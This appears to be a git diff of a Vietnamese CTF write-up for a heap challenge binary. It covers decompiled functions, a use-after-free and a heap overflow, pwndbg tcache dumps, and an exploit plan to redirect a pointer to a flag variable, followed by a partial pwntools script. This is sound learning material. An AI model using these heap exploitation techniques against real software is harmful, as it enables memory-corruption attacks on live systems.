@@ -83,8 +83,8 @@ undefined8 create(void)
   exit(0);
 }
 ```
-* có `database` (là `DAT_006020e0` lúc trước) là vùng nhớ trên heap, chứa các pointer `data` từ 0 đến 8
-* có `data` là vùng nhớ được cấp phát động để chứa pointer trỏ đến chunk của `content` cũng được cấp phát động theo `size` do người dùng đặt
+* có `database` (là `DAT_006020e0` lúc trước) là vùng nhớ trên binary, chứa các pointer `data` từ 0 đến 8
+* có `data` là vùng nhớ được cấp phát động trên heap để chứa pointer trỏ đến chunk của `content` cũng được cấp phát động theo `size` do người dùng đặt
 * có `size` tối đa = `4096`, có thể tận dụng cho **heap overflow**
 `delete()`:
 ```c
@@ -110,6 +110,11 @@ undefined8 delete(void)
   exit(0);
 }
 ```
+* có `free()` phần chunk của `content` chứa userdata mình nhập vào ("Input data:")
+* có `free()` phần chunk của `data` chứa pointer đến chunk của `content`
+
+==> Có thể khai thác lỗ hổng **Use-After-Free** để tái sử dụng phần chunk trên
+
 `flag_check()`:
 ```c
 undefined8 flag_check(void)
@@ -121,15 +126,140 @@ undefined8 flag_check(void)
   return 0;
 }
 ```
+* có `DAT_006020f0` là vùng nhớ trên heap cận kề vùng `database` (`DAT_006020e0`):
 
 <img width="695" height="447" alt="image" src="https://github.com/user-attachments/assets/4b9b37f5-5382-40d6-9b99-f3e132183f2c" />
 
+* điều kiện để có flag là:
+  ```
+  DAT_006020f0 != 0
+  DAT_006020f0 + 8 == 0xabcdef
+  ```
+* tuy nhiên `database` là list chỉ nhận 8 địa chỉ con trỏ, nên ta không thể overwrite đến được địa chỉ `DAT_006020f0` 
 ___
+### Ý tưởng exploit:
+* Tạo vùng nhớ data với `create()` và lưu pointer vào từ index 0 của `database`
+    ```asm
+    pwndbg> x/4gx 0x006020e0
+    0x6020e0:       0x00000000154732a0      0x0000000000000000
+    0x6020f0:       0x0000000000000000      0x0000000000000000
+    ```
+  bao gồm:
+  * chunk `data` chứa pointer của `content` 
+  * chunk `content` chứa phần data user input vào
+  * Lấy `size` = 100 (0x70)
+    ```asm
+    pwndbg> heap
+    Allocated chunk | PREV_INUSE
+    Addr: 0x15473000
+    Size: 0x290 (with flag bits: 0x291)
+    
+    Allocated chunk | PREV_INUSE
+    Addr: 0x15473290
+    Size: 0x20 (with flag bits: 0x21)
+    
+    Allocated chunk | PREV_INUSE
+    Addr: 0x154732b0
+    Size: 0x70 (with flag bits: 0x71)
+    
+    Top chunk | PREV_INUSE
+    Addr: 0x15473320
+    Size: 0x20ce0 (with flag bits: 0x20ce1)
+    ```
+    ```asm
+    pwndbg> vis
+    0x15473000      0x0000000000000000      0x0000000000000291      ................
+    0x15473010      0x0000000000000000      0x0000000000000000      ................
+    ...
+    0x15473280      0x0000000000000000      0x0000000000000000      ................
+    0x15473290      0x0000000000000000      0x0000000000000021      ........!.......
+    0x154732a0      0x00000000154732c0      0x0000000000000000      .2G............. <== [data] chunk 
+    0x154732b0      0x0000000000000000      0x0000000000000071      ........q.......
+    0x154732c0      0x0000000000000000      0x0000000000000000      ................ <== [content] chunk
+    0x154732d0      0x0000000000000000      0x0000000000000000      ................
+    0x154732e0      0x0000000000000000      0x0000000000000000      ................
+    0x154732f0      0x0000000000000000      0x0000000000000000      ................
+    0x15473300      0x0000000000000000      0x0000000000000000      ................
+    0x15473310      0x0000000000000000      0x0000000000000000      ................
+    0x15473320      0x0000000000000000      0x0000000000020ce1      ................         <-- Top chunk
+    ```
+    <img width="820" height="237" alt="image" src="https://github.com/user-attachments/assets/b0819ea8-6760-4348-8844-721001829b90" />
 
+* Giải phóng các chunk với `delete()`
+  * cả chunk `content` và `data` được đưa vào bin tcache
+    ```asm
+    pwndbg> bins
+    tcachebins
+    0x20 [  1]: 0x154732a0 ◂— 0
+    0x70 [  1]: 0x154732c0 ◂— 0
+    ```
+    ```asm
+    Free chunk (tcachebins) | PREV_INUSE
+    Addr: 0x15473290
+    Size: 0x20 (with flag bits: 0x21)
+    fd: 0x15473
+    
+    Free chunk (tcachebins) | PREV_INUSE
+    Addr: 0x154732b0
+    Size: 0x70 (with flag bits: 0x71)
+    fd: 0x15473
+    ```
+    <img width="805" height="222" alt="image" src="https://github.com/user-attachments/assets/50ba5a8b-0dfd-4447-b450-3cce0b42d941" />
 
+* Tái sử dụng các freed chunk trên với `create()`: 
 
+TLDR:
 
+ta có `data->content = content` nghĩa là lưu pointer của chunk content, rồi mới read vào con trỏ trong data->content. Vì vậy ta có thể overwrite địa chỉ con trỏ trong data->content với địa chỉ `DAT_006020f0`, rồi sau đó khi thực hiện `read()`, sẽ đọc vào đấy. Và ta sẽ đặt điều kiện theo flag.
 
+___
+`script.py`:
+```python
+from pwn import *
+
+libc = ELF("./libc.2.23.so", checksec=False)
+
+context.binary = exe = ELF("./pwn1_ff_copy", checksec=False)
+context.log_level = "debug"
+
+def GDB():
+	gdb.attach(p, gdbscript='''
+		handle SIGALRM ignore
+		# main
+		br *0x400ca9
+		# create
+		br *0x400aa2
+		br *0x400b06
+		# delete
+		br *0x400b67
+		br *0x400bde
+
+		# heap check:
+		# heap [-v]
+		# vis
+		# vmmap
+		# x/4gx 0x006020e0
+		''')
+
+p = process(exe.path)
+GDB()
+
+# create heap at [0] #############
+p.sendlineafter(b">", b"1")
+p.sendlineafter(b"size:", b"100")
+p.sendlineafter(b"data:", b"AAAA")
+
+# delete heap at [0] #############
+p.sendlineafter(b">", b"2")
+p.sendlineafter(b"index:", b"0")
+
+# database: 0x006020e0
+
+# flag_check: DAT_006020f0: != 0
+# flag_check: DAT_006020f0 + 8: 0xabcdef
+
+p.interactive()
+```
 
 
 ___
